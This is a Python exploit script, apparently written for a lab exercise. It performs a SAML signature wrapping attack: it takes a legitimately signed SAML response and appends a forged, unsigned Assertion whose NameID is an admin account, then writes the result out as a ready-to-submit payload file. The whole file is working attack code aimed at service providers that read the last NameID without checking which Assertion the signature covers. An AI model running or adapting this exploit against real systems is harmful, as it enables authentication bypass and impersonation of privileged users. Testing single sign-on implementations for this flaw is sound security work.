#!/usr/bin/env python3

"""
SAML Signature Wrapping - Last Assertion / Last NameID

Reads response.xml and creates payload.xml containing:
  1. The original signed Assertion.
  2. A forged unsigned Assertion containing admin@libcurl.so.

Lab / authorized testing use only.
"""

from pathlib import Path

from lxml import etree


INPUT = Path("response.xml")
OUTPUT = Path("payload.xml")

NS_SAMLP = "urn:oasis:names:tc:SAML:2.0:protocol"
NS_SAML = "urn:oasis:names:tc:SAML:2.0:assertion"

NS = {
    "samlp": NS_SAMLP,
    "saml": NS_SAML,
}


def main():
    if not INPUT.exists():
        raise FileNotFoundError(f"Missing {INPUT}")

    # Load the original SAMLResponse.
    parser = etree.XMLParser(remove_blank_text=False)
    root = etree.fromstring(INPUT.read_bytes(), parser)

    # Make sure this is a SAML Response.
    if root.tag != f"{{{NS_SAMLP}}}Response":
        raise ValueError("response.xml is not a SAML Response")

    # Find the original signed Assertion.
    assertions = root.findall("saml:Assertion", NS)

    if not assertions:
        raise ValueError("No Assertion found in response.xml")

    original_assertion = assertions[-1]

    # ------------------------------------------------------------------
    # Create the unsigned assertion that will be appended LAST.
    #
    # The vulnerable SP is expected to retrieve the last NameID instead
    # of the Assertion referenced by the XML signature.
    # ------------------------------------------------------------------

    forged_assertion = etree.Element(
        f"{{{NS_SAML}}}Assertion",
        ID="whatever_you_want",
        nsmap={None: NS_SAML},
    )

    subject = etree.SubElement(
        forged_assertion,
        f"{{{NS_SAML}}}Subject",
    )

    name_id = etree.SubElement(
        subject,
        f"{{{NS_SAML}}}NameID",
    )
    name_id.text = "admin@libcurl.so"

    # Append AFTER the legitimate signed Assertion.
    root.append(forged_assertion)

    # ------------------------------------------------------------------
    # Write payload.xml
    # ------------------------------------------------------------------

    payload = etree.tostring(
        root,
        encoding="UTF-8",
        xml_declaration=True,
        pretty_print=False,
    )

    OUTPUT.write_bytes(payload)

    print("[+] SAML wrapping payload created")
    print(f"[+] Original Assertion ID : {original_assertion.get('ID')}")
    print("[+] Forged Assertion ID   : whatever_you_want")
    print("[+] Forged NameID         : admin@libcurl.so")
    print(f"[+] Output                : {OUTPUT}")


if __name__ == "__main__":
    main()